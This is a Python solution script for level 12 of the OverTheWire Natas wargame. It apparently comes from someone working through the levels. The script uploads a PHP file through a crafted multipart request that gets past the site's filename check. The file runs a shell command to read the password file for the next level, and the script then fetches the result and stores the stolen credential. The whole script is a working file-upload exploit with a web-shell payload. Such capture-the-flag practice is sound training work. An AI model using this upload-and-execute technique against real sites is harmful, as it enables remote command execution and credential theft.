import re,base64,requests,natas

USER='natas12'
PASSWORD=natas.get_credential(USER)

URL='http://natas12.natas.labs.overthewire.org/'
PAYLOAD='-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\n\n1000\n-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="filename"\n\nvvx2fum75y.php\n-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="uploadedfile"; filename="test.php"\nContent-Type: application/text\n\n<?php\n    passthru(\'cat /etc/natas_webpass/natas13\');\n?>\n\n-----------------------------208637385607827912102593443--'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))

    response = requests.post (
            '%sindex.php' % URL,
            headers= {
                'Authorization':'Basic %s' % b64,
                'Content-Type':'multipart/form-data; boundary=---------------------------208637385607827912102593443'
            },
            data=PAYLOAD
    )
    
    regex=r"href=\"(\w+\/\w+\.php)\""
    matches = re.finditer(regex,response.content,re.MULTILINE)

    filename = None
    for match in matches:
        filename = match.group(1)

    if filename is None:
        print('failed to find filename')
        exit
    
    print('%s was uploaded succesfully' % filename)

    response = requests.get (
            '%s%s' % (URL,filename),
            headers=dict(Authorization='Basic %s' % b64)
    )
    password=response.content.replace('\n','')

    print('password found: %s' % password)
    print('adding to credentials....')
    natas.save_credentials('natas13',password)
    print('done')

if __name__=='__main__':
    main()
